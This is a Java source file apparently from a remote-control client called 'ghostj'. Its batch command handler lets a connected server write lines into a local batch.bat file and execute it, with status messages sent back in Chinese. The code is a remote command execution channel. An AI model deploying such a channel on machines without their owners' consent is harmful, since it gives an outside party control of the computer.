package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.cmd.CommandProcessException;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.util.FileRW;

import java.io.File;

public class FuncBatch implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!bat";
	}

	@Override
	public String[] getParamsModel() {
		return new String[]{"<oper>","[params]"};
	}

	@Override
	public String getDescription() {
		return "批处理文件";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		if(!new File("batch.bat").exists()){
			FileRW.write("batch.bat","");
		}
		switch (params[0]){
			case "reset":{
				FileRW.write("batch.bat","");
				HandleConn.writeToServer("已清空bat文件\n");
				break;
			}
			case "add":{
				if(params.length<2){
					HandleConn.writeToServer("命令语法不正确\n");
					break;
				}
				StringBuffer newLine=new StringBuffer();
				for(int i=1;i<params.length;i++){
					newLine.append(params[i]+" ");
				}
				FileRW.write("batch.bat",newLine.toString()+"\n",true);
				HandleConn.writeToServer("已添加"+newLine+"\n");
				break;
			}
			case "view":{

				String fileStr=FileRW.readWithLn("batch.bat");
				HandleConn.writeToServer("客户端的batch文件内容:\n"+fileStr+"共"+fileStr.length()+"个字符\n");
				break;
			}
			case "run":{
				HandleConn.writeToServer("正在启动batch.bat.\n");
				try {
					processor.start("batch.bat");
				} catch (CommandProcessException e) {
					e.printStackTrace();
					HandleConn.writeToServer("启动出错"+ ClientMain.getErrorInfo(e)+"\n");
				}
				break;
			}
			default:{
				HandleConn.writeToServer("命令语法不正确\n");
			}
		}
		HandleConn.sendFinishToServer();
	}
}
